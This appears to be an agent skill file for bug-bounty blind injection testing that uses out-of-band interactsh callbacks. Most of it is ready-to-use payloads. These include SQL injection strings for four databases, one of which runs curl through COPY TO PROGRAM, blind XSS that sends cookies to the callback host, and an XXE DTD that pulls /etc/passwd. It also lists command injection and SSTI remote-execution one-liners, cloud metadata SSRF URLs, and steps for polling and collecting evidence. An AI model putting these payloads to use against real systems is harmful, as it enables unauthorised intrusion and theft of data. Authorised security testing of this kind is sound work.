---
name: blind-injection
description: |
  Blind injection testing (SQL, SSRF, XXE, command injection) using VPS interactsh
  for out-of-band callbacks. Use when: payloads return no visible error, need OOB
  confirmation for SSRF, blind SQL, blind XSS, blind XXE. Trigger for: "blind",
  "no output", "OOB", "out-of-band", "SSRF no response", "DNS callback".
---
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**


## When to Invoke

| Trigger | Example |
|---------|---------|
| No visible error output from injection attempt | Payload sent, response unchanged |
| SSRF candidate but no redirect or body change | Timing diff or rate limit hit but no content leak |
| Blind SQLi suspected (timing or error suppressed) | Login delay but no error message |
| Blind XSS (stored, admin panel) | Payload stored but you can't see the admin panel |
| Blind XXE | XML accepted but no entity content reflected |
| Command injection — no stdout in response | Web shell not returned, but command may have run |

Do NOT use time-based fallback as primary confirmation. Always attempt OOB first.

---

## Step 0 — Setup OOB Infrastructure (always first)

**Check if VPS is already running with interactsh:**

```bash
python {AGENT}/engine/vps/vultr.py status \
  --state {FINDINGS}/tmp/vps-state.json 2>/dev/null || echo "NO_VPS"
```

**If no VPS — start one and launch interactsh:**

```bash
python {AGENT}/engine/vps/vultr.py interactsh \
  --state {FINDINGS}/tmp/vps-state.json
```

Output will contain:

```
OOB_DOMAIN=abc123xyz.oast.fun
POLL_URL=https://abc123xyz.oast.fun/poll
```

Save these — every payload in this skill uses `{OOB}` as a placeholder for `OOB_DOMAIN`.

**If VPS already running — retrieve existing OOB domain:**

```bash
python -c "
import json
state = json.load(open('{FINDINGS}/tmp/vps-state.json'))
print(state.get('oob_domain', 'NOT SET'))
"
```

---

## Step 1 — Payload Generation by Injection Type

Replace `{OOB}` with your actual OOB domain in every payload below.

### SSRF

```
# Direct URL injection — place in any URL parameter or webhook field
http://{OOB}/ssrf-{param_name}

# With metadata path (cloud SSRF)
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

# Protocol variants (bypass URL validators)
http://{OOB}@expected-host.com/
http://expected-host.com#{OOB}/
http://expected-host.com?.{OOB}/

# DNS-only SSRF (for strict HTTP filters)
# Any DNS lookup to {OOB} counts as confirmed
```

```bash
# Test with curl — substitute your actual OOB domain
curl -s -X POST https://{target}/api/webhook \
  -H "Content-Type: application/json" \
  -d "{\"url\": \"http://{OOB}/ssrf-webhook\"}"
```

### Blind SQL Injection

**MySQL — DNS exfiltration:**
```sql
'; SELECT LOAD_FILE(concat('\\\\','{OOB}','\\path')); --
' UNION SELECT LOAD_FILE(concat(0x5c5c,'{OOB}',0x5c,'x')); --
```

**MSSQL — SMB via xp_dirtree:**
```sql
'; exec master..xp_dirtree '//{OOB}/x'; --
'; exec master..xp_fileexist '//{OOB}/x'; --
```

**PostgreSQL — DNS via COPY:**
```sql
'; COPY (SELECT '') TO PROGRAM 'curl http://{OOB}/pg'; --
'; SELECT dblink_connect('host={OOB}'); --
```

**Oracle — UTL_HTTP:**
```sql
' || UTL_HTTP.request('http://{OOB}/oracle') || '
' UNION SELECT UTL_HTTP.request('http://{OOB}/oracle') FROM dual; --
```

### Blind XSS (stored — triggers in admin panel)

```html
"><script src="https://{OOB}/xss.js"></script>
"><img src=x onerror="fetch('https://{OOB}/xss?c='+document.cookie)">
'"><svg onload="new Image().src='https://{OOB}/xss?u='+document.domain">
```

Store in every user-controlled text field that an admin might view:
- Profile name / bio
- Support ticket subject/body
- Product review
- Address fields
- File upload filename

### Blind XXE

**Classic DTD:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://{OOB}/xxe">
]>
<root>&xxe;</root>
```

**Parameter entity (for blind XXE where direct entity injection is blocked):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://{OOB}/ext.dtd">
  %remote;
  %exfil;
]>
<root/>
```

Hosted `ext.dtd` on your OOB server:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY &#x25; out SYSTEM 'http://{OOB}/leak?d=%data;'>">
```

### Command Injection

```bash
# HTTP callback (Linux)
; curl http://{OOB}/cmd; #
| curl http://{OOB}/cmd |
`curl http://{OOB}/cmd`
$(curl http://{OOB}/cmd)

# DNS-only (for strict egress — slower detection)
; ping -c 1 {OOB}; #
| nslookup {OOB} |

# Windows targets
& curl http://{OOB}/cmd &
; Invoke-WebRequest http://{OOB}/cmd ;
```

### SSTI (Server-Side Template Injection)

```
# Jinja2/Python — HTTP callback via subprocess
{{''.__class__.__mro__[1].__subclasses__()[401](['curl','http://{OOB}/ssti'],stdout=-1).communicate()}}

# Jinja2 — DNS via socket
{{''.__class__.__mro__[1].__subclasses__()[276]('curl http://{OOB}/ssti',shell=True,stdout=-1).communicate()}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://{OOB}/ssti")}

# Twig (PHP)
{{[0]|reduce('system','curl http://{OOB}/ssti')}}
```

---

## Step 2 — Send Payloads

Send each payload to the target parameter. Use a unique path suffix per parameter so
the callback tells you WHICH parameter was injectable:

```
http://{OOB}/ssrf-profile-avatar-url
http://{OOB}/ssrf-webhook-endpoint
http://{OOB}/sqli-search-q
http://{OOB}/cmdi-filename
```

This removes ambiguity when multiple payloads are in-flight simultaneously.

```bash
# Example: testing multiple params in sequence
for param in "avatar_url" "webhook" "redirect_url" "image_src"; do
  curl -s -X POST https://{target}/api/settings \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"$param\": \"http://{OOB}/test-$param\"}"
  sleep 1
done
```

---

## Step 3 — Poll for Callbacks

**Start polling immediately after sending payloads.**

```bash
python {AGENT}/engine/vps/vultr.py poll \
  --state {FINDINGS}/tmp/vps-state.json
```

Poll continuously for 60 seconds per parameter tested. If no callback after 60s,
the parameter is inconclusive at that entry point (not confirmed injectable there).

**Poll output format:**

```
[+] Callback received at 14:23:07
    Protocol: HTTP
    Source IP: 13.55.xx.xx
    Path: /ssrf-webhook
    Method: GET
    Headers: {"User-Agent": "python-requests/2.28.0"}
    Body: (empty)
```

**What each callback type tells you:**

| Callback | Meaning | Report severity |
|----------|---------|----------------|
| DNS only | Confirmed DNS resolution — SSRF or blind injection at network level | Medium (DNS-only) |
| HTTP GET/POST | Full server-side request — SSRF confirmed, server can reach your OOB host | High |
| HTTP with `Host: {OOB}` | Server fetched your URL — full SSRF | High |
| HTTP with file content in path/query | XXE or SQLi data exfiltration — confirmed OOB exfil | Critical |
| Callback with internal IP in source | SSRF via internal network — Critical | Critical |

---

## Step 4 — Confirmation Rules

**CONFIRMED** (report-ready):
- DNS or HTTP callback received within 60s of sending payload
- Callback path matches your unique suffix (rules out noise)
- Callback came from the target's server IP range (check ASN)

**INCONCLUSIVE** (surface to user as NEEDS-PROOF):
- No callback after 60s but timing difference >= 5s on time-based fallback
- Callback received but source IP doesn't match target (could be scanner, CDN)
- Callback received but only on one of 5 attempts (intermittent)

**NOT INJECTABLE** (discard):
- No callback after 60s AND no timing difference
- Error response indicates input was sanitised/rejected before processing

---

## Fallback: Time-Based Blind SQLi (when OOB is blocked or unavailable)

Use only when VPS/interactsh is unavailable AND you have reason to suspect SQLi.
Time-based is weaker evidence — always try OOB first.

**MySQL:**
```bash
# True condition → 5 second delay
time curl -s "https://{target}/search?q=1' AND SLEEP(5)-- -"
# False condition → no delay
time curl -s "https://{target}/search?q=1' AND SLEEP(0)-- -"
# Confirmed injectable if true > false + 4.5s and false < 0.5s
```

**MSSQL:**
```bash
time curl -s "https://{target}/search?q=1'; WAITFOR DELAY '0:0:5'-- -"
```

**PostgreSQL:**
```bash
time curl -s "https://{target}/search?q=1'; SELECT pg_sleep(5)-- -"
```

**Confirmation threshold:** Run each condition 3 times. Inject is confirmed if:
- True-condition average >= 5.0s
- False-condition average <= 0.5s
- No overlap between the two distributions

---

## Step 5 — Evidence Collection

For every confirmed callback, capture:

**1. Screenshot of poll output** showing callback with timestamp and path:
```bash
# Take screenshot via Chrome browser (mcp__claude-in-chrome__computer)
# OR save poll output to file
python {AGENT}/engine/vps/vultr.py poll \
  --state {FINDINGS}/tmp/vps-state.json \
  > {FINDINGS}/evidence/oob-callback-{param}.txt
```

**2. The exact curl command that triggered it** (redact token to first 8 chars):
```bash
# Document exactly this in the report
curl -s -X POST https://{target}/api/webhook \
  -H "Authorization: Bearer $TOKEN_A_REDACTED..." \
  -H "Content-Type: application/json" \
  -d '{"url": "http://{OOB}/ssrf-webhook"}'
```

**3. Burp/proxy request-response pair** if captured.

---

## Declaring Status

After testing a parameter:

| Result | Status tag | Next action |
|--------|------------|-------------|
| Callback within 60s, path matches | CONFIRMED | Write report via reporter-agent |
| Callback but inconsistent (1/5 attempts) | PARTIAL | Document, surface to user |
| No callback, timing diff >= 4.5s | PARTIAL | Document with timing data, surface to user |
| No callback, no timing diff | RULED OUT | Log in context.md, move on |
| CloudFront/WAF blocked payload | WAF-BLOCKED | Log in defenses.md, try WAF bypass skill |

WAF-BLOCKED findings: invoke `waf-bypass` skill before declaring a finding dead.
